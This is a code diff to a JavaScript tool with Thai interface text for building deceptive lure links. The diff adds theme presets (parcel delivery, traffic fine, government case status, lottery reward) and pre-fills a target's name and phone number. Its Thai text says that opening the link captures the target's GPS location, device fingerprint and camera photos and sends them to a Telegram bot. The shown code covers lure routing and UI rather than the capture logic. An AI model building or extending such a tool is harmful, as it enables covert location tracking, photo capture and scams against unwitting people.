@@ -369,9 +369,9 @@ function generateSuspectTrackingLink(suspectId) {
                         💡 <b>การทำงาน:</b> เมื่อเป้าหมายกดเปิดลิงก์นี้ ระบบจะจับพิกัดดาวเทียม, ลายนิ้วมือเครื่อง และถ่ายภาพส่งเข้า <b>Telegram Bot</b> ทันที
                     </div>
                     <div>
-                        <a href="${flexUrl}" target="_blank" style="display:block;text-align:center;padding:10px;background:linear-gradient(135deg,#0284c7,#0369a1);color:white;text-decoration:none;border-radius:10px;font-weight:bold;font-size:0.85rem;box-shadow:0 4px 12px rgba(2,132,199,0.3);">
+                        <button type="button" onclick="openFlexStudioDirect('${(name.trim()).replace(/'/g, "\\'")}', '${(phone).replace(/'/g, "\\'")}')" style="display:block;width:100%;text-align:center;padding:10px;background:linear-gradient(135deg,#0284c7,#0369a1);color:white;border:none;border-radius:10px;font-weight:bold;font-size:0.85rem;box-shadow:0 4px 12px rgba(2,132,199,0.3);cursor:pointer;">
                             ⚡ เปิดห้องสร้างสื่อล่อลวง & ดักพิกัด (Tracking Studio)
-                        </a>
+                        </button>
                     </div>
                 </div>
             `,
@@ -412,11 +412,50 @@ function copyGeneratedTrackUrl() {
     }
 }
 
-function openFlexStudioDirect() {
-    const targetName = (document.getElementById('track-target-name') ? document.getElementById('track-target-name').value : '').trim();
-    const targetPhone = (document.getElementById('track-target-phone') ? document.getElementById('track-target-phone').value : '').trim();
-    const flexUrl = `tracking.html?targetName=${encodeURIComponent(targetName)}&phone=${encodeURIComponent(targetPhone)}`;
-    window.open(flexUrl, '_blank');
+function openFlexStudioDirect(targetName, targetPhone, targetTheme) {
+    if (!targetName) {
+        targetName = (document.getElementById('track-target-name') ? document.getElementById('track-target-name').value : '').trim();
+    }
+    if (!targetPhone) {
+        targetPhone = (document.getElementById('track-target-phone') ? document.getElementById('track-target-phone').value : '').trim();
+    }
+    if (!targetTheme) {
+        targetTheme = (document.getElementById('track-target-theme') ? document.getElementById('track-target-theme').value : 'flash');
+    }
+
+    let preset = 'parcel';
+    let cat = 'traffic';
+    if (targetTheme === 'traffic') { preset = 'traffic'; cat = 'traffic'; }
+    else if (targetTheme === 'gov') { preset = 'case_status'; cat = 'legal'; }
+    else if (targetTheme === 'lottery') { preset = 'reward'; cat = 'finance'; }
+    else { preset = 'parcel'; cat = 'traffic'; }
+
+    if (typeof Swal !== 'undefined') Swal.close();
+
+    // 1. ถ้าทำงานอยู่ใน iframe ของระบบหลัก (index.html) ให้สลับไปยังหน้า sendflex ภายในแอพทันที (Seamless In-App Navigation)
+    if (window.parent && window.parent !== window && typeof window.parent.showPage === 'function') {
+        window.parent.showPage('sendflex');
+        setTimeout(() => {
+            try {
+                const parentDoc = window.parent.document;
+                const tName = parentDoc.getElementById('target-name');
+                const tPhone = parentDoc.getElementById('target-phone');
+                if (tName && targetName) tName.value = targetName;
+                if (tPhone && targetPhone) tPhone.value = targetPhone;
+                if (typeof window.parent.filterPresetCategory === 'function') window.parent.filterPresetCategory(cat);
+                if (typeof window.parent.selectPreset === 'function') window.parent.selectPreset(cat, preset);
+                if (typeof window.parent.syncTargetUrl === 'function') window.parent.syncTargetUrl();
+                if (typeof window.parent.updateDossierDisplay === 'function') window.parent.updateDossierDisplay();
+            } catch (err) {
+                console.warn('Error syncing data to parent tracking studio:', err);
+            }
+        }, 200);
+        return;
+    }
+
+    // 2. ถ้าเปิดเดี่ยวๆ ให้ไปที่ tracking.html ในหน้าต่างเดิมเพื่อรักษา LINE LIFF Session
+    const flexUrl = `tracking.html?targetName=${encodeURIComponent(targetName)}&phone=${encodeURIComponent(targetPhone)}&preset=${encodeURIComponent(preset)}`;
+    window.location.href = flexUrl;
 }
 
 async function testTelegramBotPing() {
